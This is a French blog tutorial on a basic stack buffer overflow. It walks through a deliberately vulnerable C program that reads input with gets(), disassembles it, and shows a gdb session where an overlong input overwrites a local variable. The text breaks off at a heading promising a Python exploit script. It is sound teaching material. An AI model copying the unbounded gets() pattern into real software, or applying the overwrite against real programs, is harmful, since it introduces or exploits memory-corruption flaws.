# 

## The Bug
Le Buffer Overflow est un bug qui se produit lorsqu&#39;un programme ecrit dans un buffer plus de bytes que le buffer ne peut en accueillir. 
Ce que l&#39;on designe par le terme de buffer est une zone memoire dont le programme controle le contenu. Cela peut representer n&#39;importe quel element present en memoire (variables, constantes, zone memoire dynamique...).

Le probleme avec ce bug etant que le programme tout entier s&#39;appuie sur la memoire pour fonctionner. Ainsi en debordant du buffer le programme va potentiellement reecrire d&#39;autres elements presents en memoire et donc des element necessaire a son propre fonctionnement, ce qui va souvent provoquer un crash.

## Demonstration du Bug
Pour que ce soit plus parlant voici un exemple tres basique que l&#39;on va etudier en assembleur pour mieux comprendre le reel fonctionnement du programme et comment il interragit avec la memoire.
```c title:test.c
#include &lt;stdio.h&gt;

int main(){
	int check = 0;
	char buffer[16];

	gets(buffer);
	if (check == 0x1337)
		printf(&#34;Well Done!!&#34;);
	return 0;
}
```

### Analysis
Le programme est tres simple. Il defini une variable **check** qu&#39;il initialise a 0. Il defini ensuite un tableau de caracteres, que l&#39;on peu definir comme un buffer puisque un tableau de 16 carateres reprensente concretement une zone memoire de 16 bytes reservee a cette variable. Ensuite, il lit depuis l&#39;entree standard et save l&#39;input lu dans le buffer. Enfin, il verifie que la variable **check** est bien egale a **0x1337**.

Ca peut paraitre un peu bizarre. Pourquoi la variable check serait egale a 0x1337 si elle a ete initialisee a 0 et inchangee. Et bien peut etre que le programme est vulnerable et que l&#39;on peut reecrire la valeur de check 😈.

Si on s&#39;en referre a la man page de gets(), on se rend compte que la fonction gets() lit la premiere ligne de l&#39;entree standard (stdin) et la sauvegarde dans le buffer passe en parametre.
```md title:man_gets
DESCRIPTION

       gets()  reads  a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a
       null byte (&#39;\0&#39;).  No check for buffer overrun is performed (see BUGS below).
```

Wait, wait, wait... Si gets() lit la premiere ligne de stdin, et que notre buffer ne peut accueilir que 16 bytes, que se passe-t-il si la ligne lu fait plus de 16 bytes?

### Assembly
Pour le comprendre, regardons ce que fait le programme en bas niveau :
```nasm title:test.s
push   rbp
mov    rbp,rsp
sub    rsp,0x20
mov    DWORD PTR [rbp-0x4],0x0
lea    rax,[rbp-0x20]
mov    rdi,rax
mov    eax,0x0
call   0x1040 &lt;gets@plt&gt;
cmp    DWORD PTR [rbp-0x4],0x1337
jne    0x1186 &lt;main&#43;61&gt;
lea    rax,[rip&#43;0xe8b]        # 0x2004
mov    rdi,rax
mov    eax,0x0
call   0x1030 &lt;printf@plt&gt;
mov    eax,0x0
leave
ret
```

Concretement, il y a 2 parties interressantes a regarder :
- D&#39;abord, le programme va sauvegarder la valeur de check sur la stack.
```nasm
mov    DWORD PTR [rbp-0x4],0x0
```
- Ensuite il reserve une zone memoire de minimum 16 bytes (sur la stack) et passe son adresse en argunent a gets().
```nasm
lea    rax,[rbp-0x20]
mov    rdi,rax
mov    eax,0x0
call   0x1040 &lt;gets@plt&gt;
```

Ainsi, si on deroule l&#39;execution du programme notre stack va ressembler a quelque chose comme ca:
[SCHEMA]

### Exploit
Si on s&#39;interesse a ce que fait reelement la fonction gets(), elle prend tout simplement un adresse memoire (ici l&#39;adresse de notre buffer), et y ecrit les bytes lus depuis l&#39;entree standard. Le probleme est qu&#39;a l&#39;adresse de buffer&#43;0x1c, il y a la valeur de check. Donc si gets lit plus de 28 bytes, il va ecrire par dessus la valeur de check.
[SCHEMA]

Si on lance un debugger, qu&#39;on test notre exploit et qu&#39;on break sur l&#39;instruction qui verifie la valeur de check, on peut voir qu&#39;on a bien reecrit la valeur de check sauvegardee en memoire.
```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000001149 &lt;&#43;0&gt;:	push   rbp
   0x000000000000114a &lt;&#43;1&gt;:	mov    rbp,rsp
   0x000000000000114d &lt;&#43;4&gt;:	sub    rsp,0x20
   0x0000000000001151 &lt;&#43;8&gt;:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000001158 &lt;&#43;15&gt;:	lea    rax,[rbp-0x20]
   0x000000000000115c &lt;&#43;19&gt;:	mov    rdi,rax
   0x000000000000115f &lt;&#43;22&gt;:	mov    eax,0x0
   0x0000000000001164 &lt;&#43;27&gt;:	call   0x1040 &lt;gets@plt&gt;
   0x0000000000001169 &lt;&#43;32&gt;:	cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000001170 &lt;&#43;39&gt;:	jne    0x1186 &lt;main&#43;61&gt;
   0x0000000000001172 &lt;&#43;41&gt;:	lea    rax,[rip&#43;0xe8b]        # 0x2004
   0x0000000000001179 &lt;&#43;48&gt;:	mov    rdi,rax
   0x000000000000117c &lt;&#43;51&gt;:	mov    eax,0x0
   0x0000000000001181 &lt;&#43;56&gt;:	call   0x1030 &lt;printf@plt&gt;
   0x0000000000001186 &lt;&#43;61&gt;:	mov    eax,0x0
   0x000000000000118b &lt;&#43;66&gt;:	leave
   0x000000000000118c &lt;&#43;67&gt;:	ret

(gdb) b *main&#43;32
Breakpoint 1 at 0x1169

(gdb) r
Starting program: /root/a.out
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

On inspecte le contexte dans lequel on a break dans gdb.
```
(gdb) x/i $rip
=&gt; 0x555555555169 &lt;main&#43;32&gt;:	cmp    DWORD PTR [rbp-0x4],0x1337

(gdb) x/wx $rbp-0x4
0x7fffffffe2dc:	0x42424242
```

On a donc bien reussi a overwrite la valeur de check 🙂.

### Scripting the Exploit
Pour finaliser la technique d&#39;exploitation, on va faire un petit script python qui va gerer toutes les interactions a notre place.



---

> Author:   
> URL: http://my.littlepwney.fr/pwn/stack-buffer-overflow/basic-overflow/  

